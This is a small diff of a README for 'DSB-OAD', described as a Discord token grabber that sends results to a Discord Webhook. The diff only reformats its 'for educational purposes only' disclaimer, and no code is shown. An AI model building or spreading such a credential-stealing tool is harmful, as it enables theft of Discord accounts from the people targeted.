@@ -1,4 +1,4 @@
-**FOR EDUCATIONAL PURPOSES ONLY. I AM NOT RESPONSIBLE FOR YOUR ACTIONS**
+****FOR EDUCATIONAL PURPOSES ONLY. I AM NOT RESPONSIBLE FOR YOUR ACTIONS****
 # DSB-OAD
 A simple token grabber to grab your discord token. It sends all results to a Discord Webhook.
 
